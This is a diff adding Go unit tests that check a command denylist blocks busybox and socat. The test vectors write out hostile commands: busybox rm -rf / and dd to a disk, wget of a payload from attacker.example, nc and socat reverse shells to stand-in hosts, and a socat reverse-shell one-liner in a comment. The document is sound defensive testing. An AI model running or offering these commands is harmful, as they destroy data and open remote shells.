@@ -1140,3 +1140,56 @@ func TestIsDenied_BlocksTruncateAndShred(t *testing.T) {
 		}
 	}
 }
+
+// TestIsDenied_BlocksBusybox verifies that busybox is denied by
+// DefaultDeniedCommands. busybox is a multi-call binary that bundles nearly
+// every Unix utility (sh, rm, wget, nc, …) under a single executable. Because
+// isDenied checks filepath.Base(argv[0]) — i.e. "busybox" — and not the applet
+// name passed as the first argument, allowing busybox would let any other denied
+// command run undetected (e.g. "busybox rm -rf /" or "busybox sh -c '...'").
+// busybox is the default shell environment on Alpine-based containers and is
+// common on embedded Linux systems used in monitoring infrastructure.
+func TestIsDenied_BlocksBusybox(t *testing.T) {
+	denied := [][]string{
+		// Denylist bypass via destructive applet.
+		{"busybox", "rm", "-rf", "/"},
+		{"busybox", "dd", "if=/dev/zero", "of=/dev/sda"},
+		// Denylist bypass via shell applet — equivalent to "bash -c '...'".
+		{"busybox", "sh", "-c", "reboot"},
+		{"busybox", "ash", "-c", "shutdown now"},
+		// Denylist bypass via network applet.
+		{"busybox", "wget", "http://attacker.example/payload"},
+		{"busybox", "nc", "-e", "/bin/sh", "10.0.0.1", "4444"},
+		// Absolute path must be normalised and still denied.
+		{"/bin/busybox", "rm", "-rf", "/"},
+		// Bare invocation with no applet argument must also be denied.
+		{"busybox"},
+	}
+	for _, argv := range denied {
+		if !isDenied(DefaultDeniedCommands, argv) {
+			t.Errorf("expected busybox variant denied: %v", argv)
+		}
+	}
+}
+
+// TestIsDenied_BlocksSocat verifies that socat is denied by
+// DefaultDeniedCommands. socat is a more capable successor to nc/netcat: it
+// can relay data between arbitrary address types (TCP, UDP, Unix sockets,
+// PTYs, files) and is commonly used to establish fully interactive reverse
+// shells ("socat TCP:attacker:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane")
+// or to exfiltrate files to a remote host.
+func TestIsDenied_BlocksSocat(t *testing.T) {
+	denied := [][]string{
+		{"socat", "TCP:10.0.0.1:4444", "EXEC:/bin/sh,pty,stderr,setsid"},
+		{"socat", "-", "TCP:attacker.example:1234"},
+		{"/usr/bin/socat", "TCP-LISTEN:4444,fork", "EXEC:/bin/bash"},
+		{"socat", "OPENSSL:attacker.example:443,verify=0", "EXEC:/bin/sh"},
+		// Bare socat with no arguments must also be denied.
+		{"socat"},
+	}
+	for _, argv := range denied {
+		if !isDenied(DefaultDeniedCommands, argv) {
+			t.Errorf("expected socat denied: %v", argv)
+		}
+	}
+}
